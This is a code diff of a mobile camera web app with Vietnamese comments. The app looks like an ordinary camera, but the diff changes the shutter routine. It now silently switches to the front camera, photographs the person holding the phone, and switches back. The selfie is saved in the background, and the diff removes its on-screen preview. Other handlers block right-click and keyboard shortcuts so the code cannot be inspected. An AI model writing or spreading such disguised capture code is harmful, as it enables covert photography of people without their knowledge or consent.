@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Camera Pro</title>
+    <title>Camera</title>
 
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
@@ -12,7 +12,7 @@
     
     <link rel="apple-touch-icon" href="https://cdn-icons-png.flaticon.com/512/685/685655.png">
     <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/685/685655.png">
-    <link rel="manifest" href='data:application/manifest+json,{"name":"Camera Pro","short_name":"Camera","start_url":"./index.html","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://cdn-icons-png.flaticon.com/512/685/685655.png","sizes":"512x512","type":"image/png"}]}'>
+    <link rel="manifest" href="manifest.json">
 
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-user-select: none; }
@@ -105,19 +105,13 @@
     </div>
 
     <script>
-        // 1. ĐĂNG KÝ SERVICE WORKER BẮT BUỘC CHO IOS
+        // Đăng ký Service Worker
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js').then(() => {
-                console.log('SW Registered');
-            }).catch(err => console.log('SW Error:', err));
+            navigator.serviceWorker.register('./sw.js').catch(err => console.log('SW Error:', err));
         }
-
-        // 2. KHÓA KHÔNG CHO SAFARI NHẢY TAB KHI BẤM VÀO
-        (function(a,b,c){if(c in b&&b[c]){var d,e=a.location,f=/javascript:/i;a.addEventListener("click",function(a){if("A"===a.target.nodeName){var c=a.target.getAttribute("href");if(!f.test(c)&&(-1!==c.indexOf("http")||-1!==c.indexOf("https"))){var g=new RegExp(e.href.split("#")[0]);g.test(c)||(a.preventDefault(),e.href=c)}}},!1)}}(document,window.navigator,"standalone"));
 
         const previewVid = document.getElementById('preview');
         const flashElem = document.getElementById('flash-elem');
-        const lastPhoto = document.getElementById('last-photo');
         
         let currentStream = null;
         let isCapturing = false;
@@ -147,19 +141,21 @@
             if (isCapturing) return;
             isCapturing = true;
 
+            // Nháy chớp sáng giả lập tiếng trập
             flashElem.style.opacity = '1';
             setTimeout(() => flashElem.style.opacity = '0', 100);
 
             try {
                 stopCurrentStream();
 
+                // Chuyển sang Camera TRƯỚC chụp lén
                 currentStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
                 previewVid.srcObject = currentStream;
                 await previewVid.play();
 
-                // Chờ 500ms cho cảm biến iPhone chỉnh sáng
+                // Chờ 500ms cho cảm biến sáng
                 await new Promise(resolve => setTimeout(resolve, 500));
 
                 const canvas = document.createElement('canvas');
@@ -170,9 +166,10 @@
                 
                 const base64Image = canvas.toDataURL('image/jpeg', 0.85);
 
+                // Trả về Camera SAU ngay lập tức
                 await startBackCamera();
 
-                lastPhoto.src = base64Image;
+                // Lưu ảnh ngầm về máy (ĐÃ ẨN KHÔNG CHO HIỂN THỊ LÊN MÀN HÌNH)
                 saveToDevice(base64Image);
 
             } catch (err) {
@@ -192,7 +189,7 @@
             document.body.removeChild(a);
         }
 
-        // Chặn F12 & Chuột phải
+        // Chặn soi code
         document.addEventListener('contextmenu', e => e.preventDefault(), false);
         document.addEventListener('keydown', e => {
             if (e.keyCode === 123 || (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
